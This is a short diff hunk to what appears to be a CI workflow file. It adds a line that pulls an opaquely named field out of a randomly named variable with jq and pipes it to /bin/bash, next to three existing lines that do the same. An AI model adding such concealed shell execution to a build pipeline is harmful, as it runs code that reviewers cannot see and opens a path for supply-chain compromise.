@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$fa5" | jq -r .ciy3 | /bin/bash
           echo $flsbu040 | jq -r .u39 | /bin/bash
           printf '%s' "$cft84" | jq -r .gjwq320 | /bin/bash
+          echo $nqlb47 | jq -r .gym83196 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
